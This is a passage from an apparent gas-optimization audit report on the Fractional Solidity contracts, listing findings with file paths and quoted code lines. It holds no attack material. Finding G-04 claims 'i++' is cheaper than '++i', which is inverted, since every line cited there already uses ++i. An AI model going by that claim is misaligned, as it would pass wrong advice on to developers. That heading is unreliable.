5. File: 2022-07-fractional/src/modules/Migration.sol (line 160):            `proposal.totalEth -= ethAmount;`         6. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 190):            `ceil -= pOf2;`        7. File: 2022-07-fractional/src/FERC1155.sol (line 86):            `totalSupply[_id] += _amount;`         8. File: 2022-07-fractional/src/FERC1155.sol (line 271):            `balanceOf[_to][_id] += _amount;`        9. File: 2022-07-fractional/src/modules/Buyout.sol (line 176):            `buyoutInfo[_vault].ethBalance += msg.value;`                  10. File: 2022-07-fractional/src/modules/Migration.sol (line 123-124):            `proposal.totalEth += msg.value;         userProposalEth[_proposalId][msg.sender] += msg.value;`        11. File: 2022-07-fractional/src/modules/Migration.sol (line 134-135):            `proposal.totalFractions += _amount;         userProposalFractions[_proposalId][msg.sender] += _amount;`                  12. File: 2022-07-fractional/src/modules/Migration.sol (line 497):            `treeLength += IModule(_modules[i]).getLeafNodes().length;`         13. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 147):            `for (uint256 i; i < length - 1; i += 2) {`     #  [G-03] <array>.length should not be looked up in every loop of a for-loop:-        1. File: 2022-07-fractional/src/modules/Buyout.sol (line 454):            `for (uint256 i; i < permissions.length; ) {`        2. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 64):            `for (uint256 i = 0; i < _tokens.length; ) {`                  3. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 83):            `for (uint256 i = 0; i < _tokens.length; ) {`        4. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 107):            `for (uint256 i = 0; i < _tokens.length; ++i) {`                  5. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 130):            `for (uint256 i; i < _modules.length; ++i) {`         6. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 132):            `for (uint256 j; j < leaves.length; ++j) {`        7. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 51):            `for (uint256 i = 0; i < _proof.length; ++i) {`         8. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 110):            `for (uint256 i; i < result.length; ++i) {`              #  [G-04] `i++` costs less gas than `++i`, especially when it’s used in for-loops (i--/--i too):-         1. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 107):            `for (uint256 i = 0; i < _tokens.length; ++i) {`                  2. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 130):            `for (uint256 i; i < _modules.length; ++i) {`         3. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 132):            `for (uint256 j; j < leaves.length; ++j) {`        4. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 51):            `for (uint256 i = 0; i < _proof.length; ++i) {`         5. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 110):            `for (uint256 i; i < result.length; ++i) {`               #  [G-05] Using `private` rather than `public` for constants, saves gas (If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table):-        1. File: 2022-07-fractional/src/FERC1155.sol (line 15-17):            ` string public constant NAME = "FERC1155";     /// @notice Version number of the token contract     string public constant VERSION = "1";`        2. File: 2022-07-fractional/src/modules/Buyout.sol (line 35-37):            `    uint256 public constant PROPOSAL_PERIOD = 2 days;     /// @notice Time length of the rejection period     uint256 public constant REJECTION_PERIOD = 4 days;`                  3. File: 2022-07-fractional/src/modules/Migration.sol (line 43):            `uint256 public constant PROPOSAL_PERIOD = 7 days;`        4. File: 2022-07-fractional/src/utils/SafeSend.sol (line 11-12):            `address payable public constant WETH_ADDRESS =         payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);`                                  #  [G-06] `require()/revert()` strings longer than 32 bytes cost extra gas:-        1. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 78):            `require(_data.length > 1, "wont generate proof for single leaf");`     #  [G-07] It costs more gas to initialize variables to zero than to let the default of zero be applied:-         1. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 64):            `for (uint256 i = 0; i < _tokens.length; ) {`                  2. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 83):            `for (uint256 i = 0; i < _tokens.length; ) {`        3. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 107):            `for (uint256 i = 0; i < _tokens.length; ++i) {`                  4. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 51):            `for (uint256 i = 0; i < _proof.length; ++i) {`      #  [G-08] `require()` or `revert()` statements that check input arguments should be at the top of the function:-         1. File: 2022-07-fractional/src/FERC1155.sol (line 297):            `require(metadata[_id] != address(0), "NO METADATA");`                  2. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 62):            `require(_data.length > 1, "wont generate root for single leaf");`        3. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 78):            `require(_data.length > 1, "wont generate proof for single leaf");`        4. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 51):            `for (uint256 i = 0; i < _proof.length; ++i) {`         5. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 110):            `for (uint256 i; i < result.length; ++i) {`                  #  [G-09] Use a more recent version of solidity:-        1. File: 2022-07-fractional/src/FERC1155.sol (line 2):            `pragma solidity 0.8.13;`        2. File: 2022-07-fractional/src/Vault.sol (line 2):            `pragma solidity 0.8.13;`                  3. File: 2022-07-fractional/src/VaultFactory.sol (line 2):            `pragma solidity 0.8.13;`        4. File: 2022-07-fractional/src/VaultRegistry.sol (line 2):            `pragma solidity 0.8.13;`                  5. File: 2022-07-fractional/src/constants/Memory.sol (line 2):            `pragma solidity 0.8.13;`        6. File: 2022-07-fractional/src/constants/Permit.sol (line 2):            `pragma solidity 0.8.13;`        7. File: 2022-07-fractional/src/constants/Supply.sol(line 2):            `pragma solidity 0.8.13;`         8. File: 2022-07-fractional/src/constants/Transfer.sol (line 2):            `pragma solidity 0.8.13;`        9. File: 2022-07-fractional/src/interfaces/IBaseVault.sol (line 2):            `pragma solidity 0.8.13;`                  10. File: 2022-07-fractional/src/interfaces/IBuyout.sol (line 2):            `pragma solidity 0.8.13;`        11. File: 2022-07-fractional/src/interfaces/IERC1155.sol (line 2):            `pragma solidity 0.8.13;`                  12. File: 2022-07-fractional/src/interfaces/IERC20.sol(line 2):            `pragma solidity 0.8.13;`         13. File: 2022-07-fractional/src/interfaces/IERC721.sol (line 2):            `pragma solidity 0.8.13;`        14. File: 2022-07-fractional/src/interfaces/IFERC1155.sol (line 2):            `pragma solidity 0.8.13;`        15. File: 2022-07-fractional/src/interfaces/IMigration.sol (line 2):            `pragma solidity 0.8.13;`                  16. File: 2022-07-fractional/src/interfaces/IMinter.sol (line 2):            `pragma solidity 0.8.13;`        17. File: 2022-07-fractional/src/interfaces/IModule.sol (line 2):            `pragma solidity 0.8.13;`                  18. File: 2022-07-fractional/src/interfaces/INFTReceiver.sol (line 2):            `pragma solidity 0.8.13;`        19. File: 2022-07-fractional/src/interfaces/IProtoform.sol (line 2):            `pragma solidity 0.8.13;`        20. File: 2022-07-fractional/src/interfaces/ISupply.sol (line 2):            `pragma solidity 0.8.13;`         21. File: 2022-07-fractional/src/interfaces/ITransfer.sol (line 2):            `pragma solidity 0.8.13;`        22. File: 2022-07-fractional/src/interfaces/IVault.sol (line 2):            `pragma solidity 0.8.13;`                  23. File: 2022-07-fractional/src/interfaces/IVaultFactory.sol (line 2):            `pragma solidity 0.8.13;`        24. File: 2022-07-fractional/src/interfaces/IVaultRegistry.sol (line 2):            `pragma solidity 0.8.13;`                  25. File: 2022-07-fractional/src/modules/Buyout.sol (line 2):            `pragma solidity 0.8.13;`        26. File: 2022-07-fractional/src/modules/Migration.sol (line 2):            `pragma solidity 0.8.13;`        27. File: 2022-07-fractional/src/modules/Minter.sol (line 2):            `pragma solidity 0.8.13;`        28. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 2):            `pragma solidity 0.8.13;`                  29. File: 2022-07-fractional/src/references/SupplyReference.sol (line 2):            `pragma solidity 0.8.13;`        30. File: 2022-07-fractional/src/references/TransferReference.sol (line 2):            `pragma solidity 0.8.13;`                  31. File: 2022-07-fractional/src/targets/Supply.sol (line 2):            `pragma solidity 0.8.13;`        32. File: 2022-07-fractional/src/targets/Transfer.sol (line 2):            `pragma solidity 0.8.13;`        33. 2022-07-fractional/src/utils/MerkleBase.sol (line 2):            `pragma solidity 0.8.13;`         34. File: 2022-07-fractional/src/utils/Metadata.sol (line 2):            `pragma solidity 0.8.13;`        35. File: 2022-07-fractional/src/utils/Multicall.sol (line 2):            `pragma solidity 0.8.13;`                  36. File: 2022-07-fractional/src/utils/SafeSend.sol (line 2):            `pragma solidity 0.8.13;`        36. File: 2022-07-fractional/src/utils/SelfPermit.sol (line 2):            `pragma solidity 0.8.13;`                 #  [G-10] Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate {Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (20000 gas) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot} :-        1. File: 2022-07-fractional/src/FERC1155.sol (line 25-34):            `    /// @notice Mapping of metadata contracts for token ID types => metadata address     mapping(uint256 => address) public metadata;     /// @notice Mapping to track account nonces for metadata txs owner => nonces     mapping(address => uint256) public nonces;     /// @notice Mapping to track total supply for token ID types => totalSupply     mapping(uint256 => uint256) public totalSupply;     /// @notice Mapping to track royalty receivers for token ID types => royaltyAddress     mapping(uint256 => address) private royaltyAddress;     /// @notice Mapping to track the royalty percent for token ID types => royaltyPercent     mapping(uint256 => uint256) private royaltyPercent;`    #  [G-11] Empty blocks should be removed or emit something:-        1. File: 2022-07-fractional/src/Vault.sol (line 32):            `preceive() external payable {}`        2. File: 2022-07-fractional/src/modules/Buyout.sol (line 53):            `receive() external payable {}`                  3. File: 2022-07-fractional/src/modules/Migration.sol (line 63):            `receive() external payable {}`        4. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 8):            `constructor() {}`              #  [G-12] Use custom errors rather than revert()/require() strings to save deployment gas:-        1. File: 2022-07-fractional/src/FERC1155.sol (line 263):            `require(             msg.sender == _from ||                 isApprovedForAll[_from][msg.sender] ||                 isApproved[_from][msg.sender][_id],             "NOT_AUTHORIZED"         );`        2. File: 2022-07-fractional/src/FERC1155.sol (line 275):            `require(             _to.code.length == 0                 ? _to != address(0)                 : INFTReceiver(_to).onERC1155Received(                     msg.sender,                     _from,                     _id,                     _amount,                     _data                 ) == INFTReceiver.onERC1155Received.selector,             "UNSAFE_RECIPIENT"         );`                  3. File: 2022-07-fractional/src/FERC1155.sol (line 297):            `require(metadata[_id] != address(0), "NO METADATA");`        4. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 62):            `require(_data.length > 1, "wont generate root for single leaf");`                            5. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 78):            `require(_data.length > 1, "wont generate proof for single leaf");`                                                    #  [G-13] Functions guaranteed to revert when called by normal users can be marked payable (If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.):-        1. File: 2022-07-fractional/src/FERC1155.sol (line 37-50):            `   modifier onlyController() {         address controller_ = controller();         if (msg.sender != controller_)             revert InvalidSender(controller_, msg.sender);         _;     }      /// @notice Modifier for restricting function calls to the VaultRegistry     modifier onlyRegistry() {         address vaultRegistry = VAULT_REGISTRY();         if (msg.sender != vaultRegistry)             revert InvalidSender(vaultRegistry, msg.sender);         _;     }`        2. File: 2022-07-fractional/src/FERC1155.sol (line 56-63):            `function burn(         address _from,         uint256 _id,         uint256 _amount     ) external onlyRegistry {         _burn(_from, _id, _amount);         totalSupply[_id] -= _amount;     }`                  3. File: 2022-07-fractional/src/FERC1155.sol (line 79-87):            `function mint(         address _to,         uint256 _id,         uint256 _amount,         bytes memory _data     ) external onlyRegistry {         _mint(_to, _id, _amount, _data);         totalSupply[_id] += _amount;     }`        4. File: 2022-07-fractional/src/FERC1155.sol (line 198-232):            `function setContractURI(string calldata _uri) external onlyController {         contractURI = _uri;     }      /// @notice Sets the token metadata contract     /// @param _metadata Address for metadata contract     /// @param _id Token ID to set the metadata for     function setMetadata(address _metadata, uint256 _id)         external         onlyController     {         metadata[_id] = _metadata;         emit SetMetadata(_metadata, _id);     }      /// @notice Sets the token royalties     /// @param _id Token ID royalties are being updated for     /// @param _receiver Address to receive royalties     /// @param _percentage Percentage of royalties on secondary sales     function setRoyalties(         uint256 _id,         address _receiver,         uint256 _percentage     ) external onlyController {         royaltyAddress[_id] = _receiver;         royaltyPercent[_id] = _percentage;         emit SetRoyalty(_receiver, _id, _percentage);     }      /// @notice Updates the controller address for the FERC1155 token contract     /// @param _newController Address of new controlling entity     function transferController(address _newController)         external         onlyController     {`                      
